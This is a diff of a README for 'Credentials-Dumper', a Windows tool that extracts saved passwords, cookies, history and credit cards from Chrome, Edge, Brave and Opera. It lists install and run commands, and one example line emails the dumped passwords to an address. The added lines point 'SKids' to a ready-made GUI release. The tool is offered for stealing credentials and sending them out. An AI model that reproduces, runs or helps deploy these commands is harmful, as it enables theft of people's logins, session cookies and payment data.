@@ -2,8 +2,6 @@
 A Tool That Display Browsers Credentials on your terminal
 ## Supported Os:
 * Windows Only
-
-* Linux soon
 ## Supported Browsers:
 | Supported browsers  | Passwords  | Cookies  | History  |  Credit Cards |
 | ------------- | ------------- | ------------- | ------------- | ------------- |
@@ -12,13 +10,14 @@ A Tool That Display Browsers Credentials on your terminal
 | Microsoft Edge |  ✅ | ✅  | ✅ | ✅
 | Brave |  ✅ | ✅  | ✅ | ✅
 ## Usage:
+### Terminal/cmd:
 ```
 git clone https://github.com/SHBBL/Credentials-Dumper.git
 pip3 install -r requirements.txt
 cd Credentials-Dumper && cd windows
 python Credentials_Dumper.py -h
 ```
-### Options:
+#### Options:
 ```
   -h, --help            show this help message and exit
   -browser , --browser  Browser Name: chrome/msedge/brave/opera
@@ -40,3 +39,5 @@ python Credentials_Dumper.py -browser msedge -send passwords -to example@example
 ``
 #### Output:
 Check Your spam or inbox
+### GUI:
+For SKids go to [RELEASES](https://github.com/SHBBL/Credentials-Dumper/releases/tag/v1.0)
